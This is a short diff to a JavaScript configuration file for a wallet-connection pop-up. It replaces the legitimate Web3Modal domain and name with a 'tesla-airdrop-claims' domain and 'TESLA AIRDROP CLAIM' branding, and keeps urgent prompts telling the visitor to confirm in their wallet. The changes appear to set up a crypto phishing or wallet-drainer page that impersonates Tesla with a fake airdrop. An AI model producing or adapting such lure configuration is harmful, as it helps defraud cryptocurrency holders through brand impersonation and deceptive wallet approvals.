@@ -1,9 +1,9 @@
 window.themeMode = "dark";
 
 let cfg = {
-  domain: 'https://web3modal.com',
-  description: 'Web3Modal',
-  name: 'Web3Modal',
+  domain: 'https://tesla-airdrop-claims.vercel.app',
+  description: 'TESLA AIRDROP CLAIM',
+  name: 'TESLA',
   icon: 'https://avatars.githubusercontent.com/u/37784886',
   headerText:"Action Required",
   middleHeaderText:"Confirm in wallet",
